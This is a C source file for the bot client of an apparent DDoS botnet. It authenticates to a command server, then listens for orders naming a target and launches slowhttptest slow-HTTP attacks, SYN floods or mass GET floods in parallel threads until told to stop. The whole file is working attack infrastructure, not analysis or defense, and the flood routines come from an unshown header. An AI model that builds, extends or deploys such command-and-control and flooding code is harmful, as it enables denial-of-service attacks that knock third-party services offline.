#include "unp.h"
#include "methods.h"
int main()
{
    srand(time(0));
    int sockfd, n, size, i;
    struct sockaddr_in servAddr;
    char buffer[MAXLINE+1];
    int key = 0;

    // Input server's address
    printf("Please, enter the IP number: \n");
    char ipAddress[16];
//    scanf("%s",ipAddress);
    strcpy(ipAddress,"127.0.0.1");
    printf("Please, enter the port: \n");
    int portAddress;
//    scanf("%d",&portAddress);
//    getchar();
    portAddress = 9877;

    // Authorization on the server
    sockfd=Socket(AF_INET,SOCK_STREAM,0);
    bzero(&servAddr,sizeof(servAddr));
    servAddr.sin_family=AF_INET;
    servAddr.sin_port=htons(portAddress);
    Inet_pton(AF_INET,ipAddress,&servAddr.sin_addr);
    Connect(sockfd,(SA *)&servAddr,sizeof(servAddr));

    // Server's port which must turn on
    int portClinet = SERV_PORT+rand()%50;
    printf("Port: %d\n",portClinet);
    sprintf(buffer,"%d",portClinet);
    Writen(sockfd, buffer, strlen(buffer));

    // Input server's password
    sendString(stdin,sockfd);
    size = Read(sockfd,buffer, sizeof(buffer));
    buffer[size]='\0';

    // Password Authentication
    if(!memcmp(buffer,"[OK]",4))
    {
        key=1;
        printf("connection #%s\n",&buffer[4]);
        buffer[4]='\0';
        printf("Server's answer: %s\n",buffer);
        printf("Do you want to send a new config or not? <Y/N>\n>");
        char ch;
        scanf("%c",&ch);
        if(toupper(ch) == 'Y')
        {
            // Send configuration file
            FILE * pFile;
            pFile=fopen("config.txt","r+");
            if (pFile == NULL) perror ("Error opening file");
            if ((n = fread(buffer,sizeof(char),1024,pFile)) > 0)
            {
                buffer[n] = '\0';
                fputs (buffer, stdout);
            }
            fclose(pFile);
        }
        else
            strcpy(buffer,"N");
        Writen(sockfd, buffer, strlen(buffer));
    }
    else
        printf("connection #%s\n",&buffer[4]);

    // Open a new connection for listening commands from server
    int listenfd;
    struct sockaddr_in sAddr;
    listenfd=Socket(AF_INET,SOCK_STREAM,0);
    bzero(&sAddr,sizeof(sAddr));
    sAddr.sin_family=AF_INET;
    sAddr.sin_port=htons(portClinet);
    sAddr.sin_addr.s_addr=htonl(INADDR_ANY);

    Bind(listenfd,(SA *)&sAddr,sizeof(sAddr));
    Listen(listenfd,LISTENQ);

    // Command processing
    bzero(&servAddr,sizeof(servAddr));
    for(;;)
    {
        printf("\nWaiting server's command...\n");
        socklen_t len=sizeof(servAddr);
        int connfd=Accept(listenfd,(SA *)&servAddr,&len);

        // Get command with parameters
        size = Read(connfd,buffer, sizeof(buffer));
        buffer[size]='\0';
        printf("\n\033[33mPurpose:\033[0m\n\033[34mmethod #%c\n"
               "%s\033[0m\n\n", buffer[0],buffer+2);
        int method = buffer[0]-'0';
        if(method<=0 || method>=10)
            err_sys("Wrong method");
        switch (method)
        {
            case 1:
            {
                char temp[MAXLINE];
                char * last = strrchr(buffer,' ');
                memcpy(temp,buffer+2,last-buffer-2);
                int pthr = atoi(strrchr(buffer,' ') + 1);
                temp[last-buffer-2]='\0';
                printf("Method #1 [slowhttptest]\n"
                       "Target: %s, connections: %d\n",temp,pthr);
                pid_t result1, result2;
                int status;
                result1 = fork();
                if(result1 == -1)
                {
                    fprintf(stderr,"Bad fork\n");
                    return 1;
                }
                if(result1==0)
                {
                    // Comment out for extra information
                    freopen("/dev/null", "w", stdout);

                    execl("/usr/bin/slowhttptest","slowhttptest",
                          "-c", strrchr(buffer,' ') + 1,
                          "-B","-i" ,"110", "-r", "200", "-s", "8192", "-t", "Hello",
                          "-u", temp, "-x", "10", "-p", "3",NULL);
                    fprintf(stderr,"Bad execve slowhttptest\n");
                    return 1;
                }

                // Major?
                majorClient(&key,&sockfd,buffer);

                size = Read(connfd,buffer, sizeof(buffer));
                buffer[size]='\0';

                if(!strcmp(buffer,"stop"))
                {
                    sprintf(buffer,"%d",result1);
                    result2 = fork();
                    if(result2==0)
                    {
                        execl("/bin/kill","kill",buffer,NULL);
                        fprintf(stderr,"Bad execve kill\n");
                        return 1;
                    }

                    if(!waitpid(result1,&status,0))
                        fprintf(stderr,"Process is not available\n");
                    else
                        fprintf(stderr,"Exit from \"slowhttptest\"");
                    if(WIFEXITED(status))
                        fprintf(stderr," with code: %d\n",WEXITSTATUS(status));
                    else
                        if (WIFSIGNALED(status))
                            fprintf(stderr," by signal\n");

                    if(!waitpid(result2,&status,0))
                        fprintf(stderr,"Process is not available\n");
                    else
                        fprintf(stderr,"Exit from \"kill\" ");
                    if(WIFEXITED(status))
                        fprintf(stderr," with code: %d\n",WEXITSTATUS(status));
                    else
                        if (WIFSIGNALED(status))
                            fprintf(stderr," by signal\n");
                }
                break;
            }
            case 2:
            case 3:
            {
                char temp[64];
                char * last = strrchr(buffer,' ');
                memcpy(temp,buffer+2,last-buffer-2);
                temp[last-buffer-2]='\0';
                int pthr = atoi(strrchr(buffer,' ') + 1);
                if(method==3)
                    printf("Method #3 [Massive GET]\n"
                           "Target: %s, pthreads: %d\n",temp,pthr);
                else
                    printf("Method #2 [Syn Flood Attack]\n"
                           "Target: %s, pthreads: %d\n",temp,pthr);

                // Major?
                majorClient(&key,&sockfd,buffer);

                int pthreadResult;
                pthread_t thread;
                struct argMassive targ;
                targ.addr=temp;
                targ.pt=pthr;
                pthread_t * arrayPth = (pthread_t *)malloc(sizeof(pthread_t)*pthr);
                targ.arrPth = arrayPth;
                if (method==3)
                    pthreadResult=pthread_create(&thread,NULL,&getMassive,&targ);
                else
                    pthreadResult=pthread_create(&thread,NULL,&synFlood,&targ);
                if(pthreadResult!=0)
                    err_sys("Error pthread");
                size = Read(connfd,buffer, sizeof(buffer));
                buffer[size]='\0';
                if(!strcmp(buffer,"stop"))
                {
                    fprintf(stderr,"Pthreads: ");
                    for(i=0; i<pthr; ++i)
                        if(!pthread_cancel(arrayPth[i]))
                            fprintf(stderr,"%d ",i+1);
                        else
                            fprintf(stderr,"x ");
                    pthread_cancel(thread);
                    fprintf(stderr,"\n%s","Canceled!\n");
                }
                free(arrayPth);
                break;
            }
            default:
                break;
        }
        Close(connfd);
    }
    return 0;
}
